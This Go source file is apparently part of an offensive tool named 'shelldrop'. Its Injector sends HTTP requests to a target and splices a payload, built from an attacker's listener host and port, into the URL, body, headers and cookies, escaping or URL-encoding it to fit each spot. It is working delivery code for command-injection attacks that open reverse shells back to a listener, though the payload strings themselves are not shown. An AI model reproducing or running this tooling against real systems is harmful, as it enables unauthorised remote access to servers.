package main

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"shelldrop/payloads"
	"strings"
	"time"
)

type (
	Injector struct {
		listenerConfig ListenerConfig
		payloadName    string
		method         string
		url            string
		data           string
		headers        map[string]string
		cookies        map[string]string
		timeout        int
	}
)

func NewInjector(payloadName string) *Injector {
	return &Injector{
		payloadName: payloadName,
	}
}

func (i *Injector) Do(ctx context.Context) error {
	url := i.setPayloadUrlEncoded(i.url)
	var body io.Reader = nil

	if i.hasData() {
		if i.hasHeader("Content-Type") {
			if strings.Contains(i.data, "\"") {
				body = strings.NewReader(i.setPayloadEscaped(i.data))
			} else {
				body = strings.NewReader(i.setPayload(i.data))
			}
		} else {
			body = strings.NewReader(i.setPayloadUrlEncoded(i.data))
		}
	}

	req, err := http.NewRequestWithContext(ctx, i.method, url, body)
	if err != nil {
		return err
	}

	if i.hasHeaders() {
		for k, v := range i.headers {
			req.Header.Set(k, i.setPayload(v))
		}
	}
	if i.hasCookies() {
		for k, v := range i.cookies {
			cookie, err := http.ParseSetCookie(fmt.Sprintf("%s=%s", k, i.setPayload(v)))
			if err == nil {
				req.AddCookie(cookie)
			}
		}
	}

	// Default to urlencoded if no content type is specified
	if i.hasData() && !i.hasHeader("Content-Type") {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}

	client := &http.Client{
		Timeout: time.Duration(i.timeout) * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	return nil
}

func (i *Injector) WithListenerConfig(listenerConfig ListenerConfig) *Injector {
	i.listenerConfig = listenerConfig
	return i
}

func (i *Injector) WithUrl(url string) *Injector {
	i.url = url
	return i
}

func (i *Injector) WithMethod(method string) *Injector {
	i.method = method
	return i
}

func (i *Injector) WithData(data string) *Injector {
	i.data = data
	return i
}

func (i *Injector) WithHeaders(headers map[string]string) *Injector {
	i.headers = headers
	return i
}

func (i *Injector) WithCookies(cookies map[string]string) *Injector {
	i.cookies = cookies
	return i
}

func (i *Injector) WithTimeout(timeout int) *Injector {
	i.timeout = timeout
	return i
}

func (i *Injector) hasData() bool {
	return i.data != ""
}

func (i *Injector) hasHeaders() bool {
	return i.headers != nil
}

func (i *Injector) hasCookies() bool {
	return i.cookies != nil
}

func (i *Injector) hasHeader(name string) bool {
	_, ok := i.headers[name]
	return ok
}

// todo: create proper validator/sanitizer for payloads
func (i *Injector) setPayload(value string) string {
	payload := payloads.Get(i.payloadName, i.listenerConfig.Host, i.listenerConfig.Port)
	return strings.Replace(value, ShellDropKeyword, payload, -1)
}

func (i *Injector) setPayloadUrlEncoded(value string) string {
	payload := payloads.GetUrlEncoded(i.payloadName, i.listenerConfig.Host, i.listenerConfig.Port)
	return strings.Replace(value, ShellDropKeyword, payload, -1)
}

func (i *Injector) setPayloadEscaped(value string) string {
	payload := payloads.Get(i.payloadName, i.listenerConfig.Host, i.listenerConfig.Port)
	escapedPayload := strings.ReplaceAll(payload, `"`, `\"`)
	return strings.Replace(value, ShellDropKeyword, escapedPayload, -1)
}
